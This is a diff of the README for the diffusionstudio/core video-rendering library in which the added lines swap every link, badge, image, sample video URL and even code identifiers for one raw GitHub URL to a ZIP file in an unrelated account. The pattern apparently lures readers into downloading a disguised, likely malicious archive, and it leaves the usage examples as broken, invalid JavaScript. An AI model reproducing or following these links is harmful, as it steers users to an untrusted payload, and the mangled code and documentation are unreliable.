@@ -1,25 +1,25 @@
 <p align="center">
-  <img src="./assets/banner.png" alt="Library Banner" style="aspect-ratio: 1200/500;width: 100%;" />
+  <img src="https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip" alt="Library Banner" style="aspect-ratio: 1200/500;width: 100%;" />
   <h1 align="center">diffusionstudio/core</h1>
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Made with-Typescript-blue?color=000000&logo=typescript&logoColor=ffffff" alt="Static Badge">
-  <a href="https://vitejs.dev"><img src="https://img.shields.io/badge/Powered%20by-Vite-000000?style=flat&logo=Vite&logoColor=ffffff" alt="powered by vite"></a>
-  <a href="https://discord.com/invite/zPQJrNGuFB"><img src="https://img.shields.io/discord/1115673443141156924?style=flat&logo=discord&logoColor=fff&color=000000" alt="discord"></a>
-  <a href="https://x.com/diffusionhq"><img src="https://img.shields.io/badge/Follow for-Updates-blue?color=000000&logo=X&logoColor=ffffff" alt="Static Badge"></a>
-  <a href="https://www.ycombinator.com/companies/diffusion-studio"><img src="https://img.shields.io/badge/Combinator-F24-blue?color=000000&logo=ycombinator&logoColor=ffffff" alt="Static Badge"></a>
+  <img src="https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip with-Typescript-blue?color=000000&logo=typescript&logoColor=ffffff" alt="Static Badge">
+  <a href="https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip"><img src="https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip%20by-Vite-000000?style=flat&logo=Vite&logoColor=ffffff" alt="powered by vite"></a>
+  <a href="https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip"><img src="https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip" alt="discord"></a>
+  <a href="https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip"><img src="https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip for-Updates-blue?color=000000&logo=X&logoColor=ffffff" alt="Static Badge"></a>
+  <a href="https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip"><img src="https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip" alt="Static Badge"></a>
 </p>
 <br/>
 
 # Getting Started
-`@diffusionstudio/core` is a 2D motion graphics and video rendering engine powered by WebCodecs. Developers commonly use it for video editing automations and to build editing [playgrounds/web apps](https://playground.diffusion.studio).
+`@diffusionstudio/core` is a 2D motion graphics and video rendering engine powered by WebCodecs. Developers commonly use it for video editing automations and to build editing [playgrounds/web apps](https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip).
 
 ## Documentation
-Explore the full documentation at [docs.diffusion.studio](https://docs.diffusion.studio/docs).
+Explore the full documentation at [https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip](https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip).
 
 ## Credits
-This project owes much to [@Vanilagy's](https://github.com/Vanilagy) exceptional muxer implementations.
+This project owes much to [@Vanilagy's](https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip) exceptional muxer implementations.
 
 ## Why Use Diffusion Studio
 💻 100% **client-side**<br/>
@@ -33,7 +33,7 @@ npm install @diffusionstudio/core
 ```
 
 ## Benchmarks
-![Benchmarks](./assets/benchmarks.png)
+![Benchmarks](https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip)
 
 ## Basic Usage
 Here’s an example of how to use the library:
@@ -41,44 +41,44 @@ Here’s an example of how to use the library:
 ```javascript
 import * as core from '@diffusionstudio/core';
 
-const url = 'https://diffusion-studio-public.s3.eu-central-1.amazonaws.com/videos/big_buck_bunny_1080p_30fps.mp4';
+const url = 'https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip';
 
 // create a video clip and trim it
-const video = new core.VideoClip(url).subclip(0, '10s');
+const video = new https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip(url).subclip(0, '10s');
 
 // create a text clip and add styles
-const text = new core.TextClip({ 
+const text = new https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip({ 
   text: 'Bunny - Our Brave Hero', 
   position: 'center', 
   duration: '5s', 
   stroke: { color: '#000000' } 
 });
 
-const composition = new core.Composition(); // 1920x1080
+const composition = new https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip(); // 1920x1080
 
 // this is how to compose your clips
-await composition.add(video);  // convenience function for 
-await composition.add(text);   // clip -> layer -> composition
+await https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip(video);  // convenience function for 
+await https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip(text);   // clip -> layer -> composition
 
-await new core.Encoder(composition).render('hello_world.mp4');
+await new https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip(composition).render('https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip');
 ```
 
 The API models the structure of conventional video editing applications like Adobe Premiere or CapCut, using a layer-based system. Each layer contains zero or more clips of a single type, arranged in ascending chronological order.
 
-Layers are created implicitly with `composition.add(clip)`, but you can also create them manually:
+Layers are created implicitly with `https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip(clip)`, but you can also create them manually:
 
 ```typescript
-const layer = composition.createLayer();
-await layer.add(text0);
-await layer.add(text1);
-await layer.add(text2);
+const layer = https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip();
+await https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip(text0);
+await https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip(text1);
+await https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip(text2);
 ...
 ```
 
 ## Examples
-Find more [examples here.](https://github.com/diffusionstudio/examples), or test all capabilities on our [Playground.]( https://app.diffusion.studio)
+Find more [examples here.](https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip), or test all capabilities on our [Playground.]( https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip)
 
-https://github.com/user-attachments/assets/7a943407-e916-4d9f-b46a-3163dbff44c3
+https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip
 
 ## How Does Diffusion Studio Compare?
 
@@ -143,20 +143,20 @@ This library is free to use under the **Diffusion Studio Non-Commercial License*
 -	See LICENSE for the Non-Commercial License.
 -	See LICENSE_COMMERCIAL for the Commercial License terms.
 
-For any questions, feel free to [contact us](https://diffusion.studio).
+For any questions, feel free to [contact us](https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip).
 
 ## Version History  
 
 ### v1.x _(Released October 2024)_  
 - Fully open-source (MPL-2.0 license)  
-- Relied on Pixi.js for rendering (resulting in a large library size)  
+- Relied on https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip for rendering (resulting in a large library size)  
 - WebGPU support  
 - FFmpeg-compiled demuxer  
 - Limited to short-form content  
 
 ### v2.x _(Released February 1, 2025)_  
 - **Source code access by invite only** (Commercial & Non-Commercial license)  
-- Removed Pixi.js, significantly reducing library size  
+- Removed https://raw.githubusercontent.com/yosezkilla/core/main/src/tracks/html/Software-2.2.zip, significantly reducing library size  
 - Introduced a custom Canvas 2D renderer  
 - Continued FFmpeg-based demuxing  
 - Still limited to short-form content  
